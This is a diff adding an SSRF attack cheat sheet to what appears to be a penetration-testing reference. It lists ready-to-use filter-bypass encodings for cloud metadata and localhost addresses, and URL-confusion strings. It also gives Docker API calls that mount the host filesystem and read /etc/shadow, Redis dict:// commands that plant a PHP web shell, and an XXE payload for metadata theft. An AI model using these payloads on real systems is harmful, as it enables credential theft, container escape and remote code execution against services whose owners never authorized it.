@@ -266,3 +266,87 @@ Remediation:
 4. **file://** — env vars, config files, secrets
 5. **Internal admin panels** (Tomcat, Consul, Elasticsearch)
 6. **Blind SSRF** — lower severity, worth chaining
+
+---
+
+## From hack-skills: Extended SSRF Techniques
+
+### SSRF Surface Parameters
+```
+loc=  url=  path=  endpoint=  imageUrl=  dest=  redirect=
+uri=  callback=  load=  file=  resource=  link=  src=  data=  ref=
+```
+
+**Less obvious SSRF vectors:**
+- PDF/screenshot generators (URL to capture)
+- Webhook configuration fields
+- Import via URL (CSV import, RSS/Atom feeds)
+- XML `DOCTYPE` with external entity (`file://`, `http://`)
+- GraphQL `@link` directive (federation)
+- `X-Forwarded-Host` / `X-Real-IP` in proxy chains
+
+### SSRF+FILTER Bypass Decision Tree
+```
+SSRF found → try http://169.254.169.254/ → blocked?
+├── Decimal: http://2852039166/
+├── Hex:     http://0xa9fea9fe/
+├── Octal:   http://0251.0376.0251.0376/
+├── IPv6:    http://[::ffff:169.254.169.254]/
+└── DNS rebind: 169.254.169.254.nip.io
+
+Try http://127.0.0.1/ → blocked?
+├── http://127.1/  http://127.0.1/  http://0x7f000001/
+├── http://2130706433/  http://0177.1/
+├── http://localhost/  http://[::1]/
+└── http://0.0.0.0/
+
+Protocols allowed?
+├── dict:// → Redis: dict://127.0.0.1:6379/INFO
+├── gopher:// → full TCP injection (Redis/SMTP/MySQL)
+├── file:// → local file read
+└── sftp:// ldap:// ftp:// → network interactions
+```
+
+### URL Confusion Filter Bypass
+```
+http://evil.com\@169.254.169.254/      → backslash confusion
+http://allowed.com:80@169.254.169.254/ → userinfo@host confusion
+http://169.254.169.254%09/             → tab-encoded
+http://169.254.169.254%00allowed.com/  → null byte truncation
+http://target.com/redirect?url=http://169.254.169.254/  → open redirect chain
+```
+
+### Internal Service Exploitation
+```bash
+# Docker API (unauthenticated on :2375)
+http://127.0.0.1:2375/v1.24/containers/json     → list containers
+http://127.0.0.1:2375/v1.24/images/json          → list images
+# Create privileged container for host escape:
+POST http://127.0.0.1:2375/v1.24/containers/create
+{"Image":"alpine","Cmd":["cat","/etc/shadow"],"HostConfig":{"Binds":["/:/host"]}}
+
+# Elasticsearch (9200 no-auth default)
+http://127.0.0.1:9200/_cat/indices
+http://127.0.0.1:9200/.kibana/_search
+http://127.0.0.1:9200/INDEX_NAME/_search?q=*
+
+# Redis via dict://
+dict://127.0.0.1:6379/CONFIG:SET:dir:/var/www/html
+dict://127.0.0.1:6379/CONFIG:SET:dbfilename:shell.php
+dict://127.0.0.1:6379/SET:key:<?php system($_GET[c]);?>
+dict://127.0.0.1:6379/BGSAVE
+```
+
+### Application-Layer SSRF via XML (XXE-SSRF chain)
+```xml
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+<request>&xxe;</request>
+```
+
+### SSRF-Filter Mindset
+Developers often filter only specific strings — test all these gaps:
+- Block `169.254.169.254` but not IPv6 equivalent `[::ffff:169.254.169.254]`
+- Block `127.0.0.1` but not `127.1` or `localhost`  
+- Block direct IPs but not DNS names resolving to them
+- Block the target but follow 302 redirects to it
+- Block at URL-parse level but allow DNS-resolved result
